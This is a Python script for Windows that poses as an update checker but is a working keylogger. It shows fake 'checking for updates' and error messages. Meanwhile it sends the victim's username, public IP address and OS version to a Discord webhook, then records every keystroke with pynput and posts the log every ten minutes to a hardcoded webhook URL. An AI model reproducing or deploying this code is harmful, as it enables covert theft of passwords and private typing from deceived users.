import os
import platform
import requests
import time
import getpass
import subprocess
import threading
import requests
import pynput


class Cheese:
    def __init__(self):
        self.TheKey = ""

    def TheLog(self, string):
        self.TheKey = self.TheKey + string

    def userkeys(self, action):
        try:
            TheKey = str(action.char)
        except AttributeError:
            TheKey = " " + str(action) + " "
        self.TheLog(TheKey)


    def LogStuff(self):
        webhook = 'https://discord.com/api/webhooks/830075882063921163/aBO6OEpTmQFHU_ogEFh9qlKH846S19AZEI5ui1DjEtqaz_OGLyKKC2QKwtWHHAJnJ_Kz'
        send = {
            "username": "got em",
            "content":  self.TheKey
        }
        requests.post(webhook, send)
        self.TheKey = ""
        Timed = threading.Timer(600, self.LogStuff)
        Timed.start()


    def start(self):
        KeyboardActions = pynput.keyboard.Listener(on_press=self.userkeys)

        with KeyboardActions:
            self.LogStuff()
            KeyboardActions.join()



print("[+] CHECKING FOR UPDATES")

OsLol = platform.system()
OsVer = platform.release()
OsInfo = OsLol +  " " + OsVer

if OsLol != 'Windows':
    print("YOUR OS IS NOT SUPPORTED EXITING..")
    time.sleep(2)
    exit()
else:
    print("[+] NO UPDATES FOUND")


try:
    requests.post("https://www.discord.com")
except Exception:
    print("WE CANNOT CHECK FOR ANY UPDATES")
    exit()

Username = getpass.getuser()

GetThe = requests.post('https://icanhazip.com').text

webhook = 'discordwebhook'

send = {
    "username": "webhookusername",
    "content": "PAYLOAD STARTED BY " + Username + " FROM " + GetThe + OsInfo
}

requests.post(webhook, send)

time.sleep(5)
print("[-] ERROR 6YSG OCCURED")

cheese = Cheese()
cheese.start()
